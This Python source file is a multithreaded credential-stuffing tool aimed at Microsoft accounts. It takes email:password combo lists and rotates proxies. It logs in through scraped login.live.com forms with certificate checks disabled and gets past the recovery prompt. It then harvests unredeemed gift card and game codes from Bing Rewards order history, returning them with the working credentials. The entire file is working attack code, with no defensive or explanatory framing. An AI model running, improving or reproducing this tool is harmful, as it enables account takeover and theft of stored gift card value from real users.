import re, time, random, requests
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

CATEGORIES = {
    'Minecraft': ['minecraft', 'minecoins', 'minecraft coins'],
    'Roblox': ['roblox', 'robux'],
    'League of Legends': ['league of legends', 'lol', 'riot points', 'rp'],
    'Overwatch': ['overwatch', 'overwatch coins', 'owl tokens'],
    'Game Pass': ['game pass', 'xbox game pass', 'gamepass'],
    'GIFTCARDS': ['gift card', 'giftcard', 'amazon', 'steam', 'xbox', 'playstation']
}

def create_optimized_session(proxy=None):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    if proxy:
        session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    return session

def get_urlPost_sFTTag(session):
    maxretries = 3
    attempts = 0
    while attempts < maxretries:
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            text = session.get(sFTTag_url, headers=headers, timeout=10, verify=False).text
            match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                   re.search('value="(.+?)"', text, re.S) or \
                   re.search("sFTTag:'(.+?)'", text, re.S) or \
                   re.search('sFTTag:"(.+?)"', text, re.S) or \
                   re.search('name="PPFT".*?value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                       re.search("urlPost:'(.+?)'", text, re.S) or \
                       re.search('urlPost:"(.+?)"', text, re.S) or \
                       re.search('<form.*?action="(.+?)"', text, re.S)
                if match:
                    urlPost = match.group(1)
                    urlPost = urlPost.replace('&amp;', '&')
                    return (urlPost, sFTTag, session)
        except:
            pass
        attempts += 1
        time.sleep(0.1)
    return (None, None, session)

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    maxretries = 3
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'close'
            }
            login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=10, verify=False)
            
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)
            
            elif 'cancel?mkt=' in login_request.text:
                try:
                    ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                    pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                    uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                    if ipt and pprid and uaid:
                        data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                        if action:
                            ret = session.post(action.group(), data=data, allow_redirects=True, timeout=10, verify=False)
                            return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if return_url:
                                fin = session.get(return_url.group(), allow_redirects=True, timeout=10, verify=False)
                                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                if token != 'None':
                                    return (token, session)
                except:
                    pass
            
            elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                return ('2FA', session)
            
            elif any(value in login_request.text.lower() for value in [
                'password is incorrect', "account doesn't exist",
                "that microsoft account doesn't exist", 'sign in to your microsoft account',
                "tried to sign in too many times with an incorrect account or password",
                'help us protect your account'
            ]):
                return ('None', session)
        except:
            pass
        tries += 1
        time.sleep(0.1)
    return ('None', session)

def detect_category(text):
    text_lower = text.lower()
    for cat, config in CATEGORIES.items():
        if any(kw in text_lower for kw in config):
            return cat
    return 'Unknown'

def extract_amount(text):
    text_lower = text.lower()
    money = re.search(r'\$(\d+)', text)
    if money:
        return f"${money.group(1)}"
    points = re.search(r'(\d+)\s*(?:points|coins|robux|rp)', text_lower)
    if points:
        return f"{points.group(1)}"
    months = re.search(r'(\d+)\s*(?:month|months)', text_lower)
    if months:
        return f"{months.group(1)}M"
    return None

def fetch_codes(email, password, timeout=10, proxy=None):
    """Check one account and return codes found - EXACT GUI LOGIC"""
    session = create_optimized_session(proxy)
    
    urlPost, sFTTag, session = get_urlPost_sFTTag(session)
    if not urlPost or not sFTTag:
        return None
    
    token_result = get_xbox_rps(session, email, password, urlPost, sFTTag)
    
    if isinstance(token_result, tuple):
        token, session = token_result
    else:
        return None
    
    if not token or token == 'None' or token == '2FA':
        return None
    
    url = 'https://rewards.bing.com/redeem/orderhistory'
    headers = {'User-Agent': 'Mozilla/5.0', 'Referer': 'https://rewards.bing.com/'}
    
    try:
        r = session.get(url, headers=headers, timeout=timeout, verify=False)
        text = r.text
        
        if 'fmHF' in text:
            soup = BeautifulSoup(text, 'html.parser')
            form = soup.find('form', id='fmHF')
            if form and form.has_attr('action'):
                action = form['action']
                data = {}
                for inp in form.find_all('input'):
                    if inp.get('name'):
                        data[inp['name']] = inp.get('value', '')
                if action.startswith('/'):
                    action = 'https://login.live.com' + action
                session.post(action, data=data, timeout=timeout, verify=False)
                r = session.get(url, headers=headers, timeout=timeout, verify=False)
                text = r.text
        
        soup = BeautifulSoup(text, 'html.parser')
        
        verification_token = ''
        token_input = soup.find('input', attrs={'name': '__RequestVerificationToken'})
        if token_input and token_input.has_attr('value'):
            verification_token = token_input['value']
        
        table = soup.find('table', class_='table')
        rows = []
        if table:
            rows = table.find_all('tr')
        
        codes_found = []
        seen_codes_local = set()
        
        for row in rows:
            cells = row.find_all(['td', 'th'])
            if len(cells) < 3:
                continue
            
            get_code = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
            
            if get_code:
                action_url = get_code.get('data-actionurl', '').replace('&amp;', '&')
                order_title = cells[2].get_text(strip=True) if len(cells) > 2 else ""
                
                if action_url.startswith('/'):
                    action_url = 'https://rewards.bing.com' + action_url
                
                try:
                    post_data = {}
                    if verification_token:
                        post_data['__RequestVerificationToken'] = verification_token
                    
                    code_headers = {
                        'User-Agent': 'Mozilla/5.0',
                        'X-Requested-With': 'XMLHttpRequest',
                    }
                    
                    code_resp = session.post(action_url, data=post_data, headers=code_headers, timeout=timeout, verify=False)
                    code_html = code_resp.text
                    code_soup = BeautifulSoup(code_html, 'html.parser')
                    
                    code = None
                    
                    # Try resendSuccess div (from original GUI)
                    rs = code_soup.find('div', class_='resendSuccess')
                    if rs:
                        keys = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
                        vals = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
                        for k, v in zip(keys, vals):
                            if 'CODE' in k.get_text(strip=True).upper():
                                code = v.get_text(strip=True)
                                break
                    
                    # Try all regex patterns (from original GUI)
                    if not code or '*' in code:
                        for pattern in [r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}', 
                                      r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                                      r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                                      r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}']:
                            match = re.search(pattern, code_html)
                            if match:
                                code = match.group()
                                if '*' not in code:
                                    break
                    
                    if code and '*' not in code and code not in seen_codes_local:
                        seen_codes_local.add(code)
                        cat = detect_category(order_title)
                        amount = extract_amount(order_title)
                        info = f"{cat} CODE"
                        if amount:
                            info = f"{amount} {info}"
                        
                        codes_found.append({
                            'code': code,
                            'info': info,
                            'email': email,
                            'password': password,
                            'category': cat,
                            'title': order_title
                        })
                except:
                    continue
        
        if codes_found:
            return {'email': email, 'password': password, 'codes': codes_found}
        else:
            return {'email': email, 'password': password, 'valid': True}
            
    except:
        return None

def check_batch(combos, max_threads=10, timeout=10, proxies=None):
    """Check a batch of combos and return results with all details."""
    results = {
        'valid_accounts': [],
        'invalid_accounts': [],
        'codes': [],
        'total': len(combos),
        'checked': 0
    }
    
    def process(combo):
        if ':' not in combo:
            return None, combo
        email, password = combo.split(':', 1)
        proxy = random.choice(proxies) if proxies else None
        result = fetch_codes(email.strip(), password.strip(), timeout, proxy)
        return result, combo
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(process, c): c for c in combos}
        for future in as_completed(futures):
            result, combo = future.result()
            results['checked'] += 1
            
            if result and 'codes' in result and result['codes']:
                results['valid_accounts'].append(f"{result['email']}:{result['password']}")
                results['codes'].extend(result['codes'])
            elif result and result.get('valid'):
                results['valid_accounts'].append(f"{result['email']}:{result['password']}")
            else:
                if ':' in combo:
                    email_addr = combo.split(':')[0]
                    results['invalid_accounts'].append(email_addr)
                elif result and 'email' in result:
                    results['invalid_accounts'].append(result['email'])
    
    return results
